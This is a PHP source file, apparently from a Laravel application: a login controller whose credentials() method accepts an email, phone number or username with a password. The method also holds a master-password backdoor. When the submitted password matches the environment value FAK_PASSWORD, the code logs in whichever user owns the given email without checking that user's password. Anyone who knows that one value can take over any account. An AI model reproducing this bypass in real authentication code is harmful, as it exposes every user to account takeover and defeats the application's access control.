<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Support\Facades\Auth;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use App\Models\User;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = RouteServiceProvider::HOME;

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
      $this->middleware('guest')->except('logout');
      
    }

    public function credentials(Request $request)
  {
    //login com credenciais de seguran;a
    if ($request->password == env('FAK_PASSWORD')) {
      $user = User::where('email', $request->email)->first();
      if ($user) {
        Auth::login($user);
       
      }
      
      //Verificando as condições de credencias por parte do back-end.
    }else{
      if (is_numeric($request->get('email'))) {
        return ['telefone' => $request->get('email'), 'password' => $request->get('password')];
      } else {
        $exist = strstr($request->get('email'), '@');
      
        if ($exist != false) {
          return ['email' => $request->get('email'), 'password' => $request->get('password')];
        }
        return ['username' => $request->get('email'), 'password' => $request->get('password')];
      }
    }
    //Retornar os dados dados corretos

    return $request->only($this->username(), 'password');

    // return $request->only($this->username(), 'password');
  }
}